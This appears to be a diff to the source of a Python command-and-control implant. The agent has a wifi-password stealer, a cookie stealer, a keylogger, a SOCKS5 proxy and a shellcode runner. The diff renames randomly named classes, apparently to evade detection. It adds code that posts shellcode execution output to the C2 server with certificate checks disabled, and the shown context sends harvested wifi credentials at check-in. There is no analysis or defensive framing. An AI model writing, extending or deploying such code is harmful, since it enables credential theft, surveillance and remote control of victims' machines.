@@ -124,7 +124,7 @@ class Crypto:
         pt = cipher.decrypt(ct)
         return json.loads(unpad(pt, AES.block_size))
 
-class uCbEmcqi:
+class aivhXgmS:
     @staticmethod
     def get_wifi_passwords():
         try:
@@ -150,7 +150,7 @@ class uCbEmcqi:
         except:
             return []
 
-class fMKOuTVR:
+class lDFWFYUl:
     def __init__(self, logger=None, config=None):
         self.logger = logger or self._create_default_logger()
         self.config = config
@@ -1142,7 +1142,7 @@ class SOCKS5Proxy:
 
 import threading
 
-class XGlNljzp:
+class qeQBDQTe:
     def __init__(self):
         self.log = ""
         self.listener = None
@@ -1488,7 +1488,7 @@ class Agent:
         self.agent_id = self._generate_agent_id()
         self._setup_logger()
         self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
-        self.keylogger = XGlNljzp()
+        self.keylogger = qeQBDQTe()
         self.ws_client = None
         self.last_checkin = 0
         self.jitter = 0.3
@@ -1539,7 +1539,7 @@ class Agent:
         if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
             data["credentials"] = {
                 
-                "wifi": uCbEmcqi.get_wifi_passwords()
+                "wifi": aivhXgmS.get_wifi_passwords()
             }
             if not self._initial_checkin:
                 self._initial_checkin = time.time()
@@ -1922,6 +1922,36 @@ class Agent:
                         try:
                             result = ShellcodeRunner.execute_runner(runner_url)
                             pass
+
+                            try:
+                                output_data = {
+                                    'agent_id': self.agent_id,
+                                    'task_id': task.get("task_id"),
+                                    'status': result.get('status', 'unknown'),
+                                    'message': result.get('message', ''),
+                                    'output': result.get('stdout', '') + result.get('stderr', ''),
+                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                                }
+
+                                response = requests.post(
+                                    f"{self.config.C2_SERVER}/api/shellcode_output",
+                                    json=output_data,
+                                    headers={
+                                        "User-Agent": self.config.USER_AGENT,
+                                        "Content-Type": "application/json"
+                                    },
+                                    timeout=30,
+                                    verify=False
+                                )
+
+                                if response.status_code == 200:
+                                    pass
+                                else:
+                                    pass
+
+                            except Exception as e:
+                                pass
+
                         except Exception as e:
                             pass
 
@@ -1955,7 +1985,7 @@ class Agent:
             elif task_type == "steal_cookies":
                 try:
                     pass
-                    stealer = fMKOuTVR(logger=self.logger, config=self.config)
+                    stealer = lDFWFYUl(logger=self.logger, config=self.config)
                     results = stealer.steal_cookies()
                     
                     if not results:
@@ -2091,13 +2121,6 @@ class Agent:
                             timeout=30,
                             verify=False
                         )
-                    if task.get("type") == "shellcode":
-                        result = self._execute_task(task)
-                        if result.get('status') == 'error':
-                            pass
-                            continue
-                        
-                        continue
                 
                 if first_checkin:
                     first_checkin = False
